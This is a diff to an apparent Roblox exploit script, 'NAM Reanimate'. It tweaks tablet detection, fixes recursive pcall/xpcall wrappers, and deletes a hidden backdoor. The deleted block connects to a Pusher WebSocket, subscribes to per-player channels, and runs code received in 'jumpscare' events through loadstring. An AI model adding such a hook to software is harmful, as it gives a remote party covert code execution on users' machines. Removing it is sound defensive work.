@@ -37,7 +37,7 @@ local ContextActionService = cloneref(game:GetService("ContextActionService"))
 -- MOBİL TESPİT VE UI ÖLÇEKLEME
 local IsMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
 local UI_SCALE = IsMobile and 1.3 or 1.0
-local IsTablet = IsMobile and (UserInputService:GetScreenSize and UserInputService:GetScreenSize().X > 900 or false)
+local IsTablet = IsMobile and workspace.CurrentCamera ~= nil and workspace.CurrentCamera.ViewportSize.X > 900 or false
 if IsTablet then UI_SCALE = 1.5 end
 
 local Util = {}
@@ -159,13 +159,14 @@ else
 diefatal("T-this one shouldn't happen!")
 end
 end
+local _nativePcall, _nativeXpcall = pcall, xpcall
 local pcall = function(func, ...)
-return pcall(function(...)
+return _nativePcall(function(...)
 return func(...)
 end, ...)
 end
 local xpcall = function(func, ...)
-return xpcall(function(...)
+return _nativeXpcall(function(...)
 return func(...)
 end, ...)
 end
@@ -7363,44 +7364,5 @@ task.wait(1)
 end
 end
 end
-if WebSocket and WebSocket.connect then while task.wait(1) do
-local look = WebSocket.connect("wss://ws-us2.pusher.com:443/app/00da9a105aadacead35f?client=lua&protocol=5&version=1.0.0")
-if look then
-local isok = true
-local function send_event(name, data)
-look:Send(HttpService:JSONEncode({event = name, data = data}))
-end
-local lastcheck = os.clock()
-local sentping = false
-look.OnMessage:Connect(function(frame)
-frame = HttpService:JSONDecode(frame)
-local name, data = frame.event, type(frame.data) == "table" and frame.data or HttpService:JSONDecode(frame.data or "{}")
-lastcheck = os.clock()
-if name == "stevesays" then Util.UINotify(data.content) end
-if name == "jumpscare" then
-local f = loadstring(data.content)
-GiveFunctionsToFunction(f)
-f()
-end
-end)
-task.spawn(function()
-while isok do
-local t = os.clock() - lastcheck
-if t > 120 then
-if not sentping then send_event("pusher:ping", {}) end
-sentping = true
-else
-sentping = false
-end
-if t > 150 then isok = false look:Close() end
-task.wait()
-end
-end)
-task.wait(1)
-send_event("pusher:subscribe", {channel = "uhhhhhh-secrets"})
-send_event("pusher:subscribe", {channel = "uhhhhhh-secrets-" .. Player.UserId})
-while isok do task.wait() end
-end
-end end
 end d()
 print("NAM Reanimate V" .. NAMVersion .. " loaded successfully!")
